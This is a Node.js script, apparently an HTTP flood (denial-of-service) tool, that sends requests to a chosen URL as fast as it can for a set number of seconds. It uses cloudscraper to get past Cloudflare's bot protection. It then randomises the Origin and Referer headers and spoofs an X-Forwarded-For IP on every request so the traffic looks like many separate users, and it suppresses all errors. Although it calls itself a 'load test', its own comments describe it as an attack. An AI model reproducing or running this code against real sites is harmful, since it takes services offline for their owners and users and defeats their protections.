// team_max_speed.js
// Usage: node team_max_speed.js <url> <time>
// Example: node team_max_speed.js http://example.com 60

const cloudscraper = require('cloudscraper');
const request = require('request');
const randomstring = require("randomstring");

// --- Helper Functions ---

// Generates a random byte for a fake IP address component
const randomByte = function() {
    return Math.round(Math.random() * 256);
};

// --- Command Line Setup ---

if (process.argv.length <= 3) {
    console.log("Usage: node team_max_speed.js <url> <time>");
    console.log("Example: node team_max_speed.js http://example.com 60");
    process.exit(-1);
}

const url = process.argv[2];
const time = parseInt(process.argv[3]);
const endTime = Date.now() + (time * 1000);

let attackLoop = null; 

// --- Attack Logic (Max Speed and Randomized Identity) ---

// 1. Get the initial Cloudflare bypass token (cookie/user-agent) only ONCE.
cloudscraper.get(url, function(error, response, body) {
    if (error) {
        console.error('Error fetching initial bypass token, exiting:', error.message);
        process.exit(1);
    }

    let initialCookie = '';
    let initialUserAgent = '';

    // Safely extract the headers
    try {
        const parsed = JSON.parse(JSON.stringify(response));
        initialCookie = parsed["request"]["headers"]["cookie"] || '';
        initialUserAgent = parsed["request"]["headers"]["User-Agent"] || '';
    } catch (e) {
        console.warn('Warning: Failed to parse Cloudscraper response, using empty headers.');
    }

    console.log(`Starting MAX SPEED load test on ${url} for ${time}s.`);

    // 2. Define the main, high-speed, randomized attack function
    function fireRequest() {
        if (Date.now() >= endTime) {
            console.log("Time limit reached. Stopping requests.");
            return;
        }

        // Generate per-request randomized headers (the human identity factor)
        const rand = randomstring.generate({
            length: 10,
            charset: 'abcdefghijklmnopqstuvwxyz0123456789'
        });
        const ip = randomByte() + '.' + randomByte() + '.' + randomByte() + '.' + randomByte();

        const options = {
            url: url,
            headers: {
                // Use the valid, single-fetch User-Agent
                'User-Agent': initialUserAgent, 
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                'Upgrade-Insecure-Requests': '1',
                // Use the valid, single-fetch Cookie
                'cookie': initialCookie,
                // These headers are randomized per request to look like a new user/session
                'Origin': 'http://' + rand + '.com',
                'Referer': 'http://google.com/' + rand,
                'X-Forwarded-For': ip, // Common technique to vary apparent source IP
                'Cache-Control': 'no-cache',
            },
            // CRUCIAL FOR UNICITY: Forces a new TCP socket for almost every request.
            agent: false, 
        };

        // Send the final request
        request(options, (error, response, body) => {
            if (error) {
                // Ignore request errors to maintain speed
            } else if (response.statusCode >= 400 && response.statusCode !== 503) {
                // console.log(`Warning: Received status code ${response.statusCode}`);
            }
        });

        // 3. Loop instantly (0ms delay) for maximum possible speed (RPS).
        attackLoop = setTimeout(fireRequest, 0);
    }
    
    // 4. Start the attack
    fireRequest();
});


// --- Error Handling and Cleanup ---

// Gracefully stop the attack when the time limit hits (redundant but safe)
setTimeout(() => {
    if (attackLoop) clearTimeout(attackLoop);
}, time * 1000);

// Ignore uncaught errors to prevent the script from crashing immediately
process.on('uncaughtException', function(err) {
    // Silent fail
});

process.on('unhandledRejection', function(err) {
    // Silent fail
});
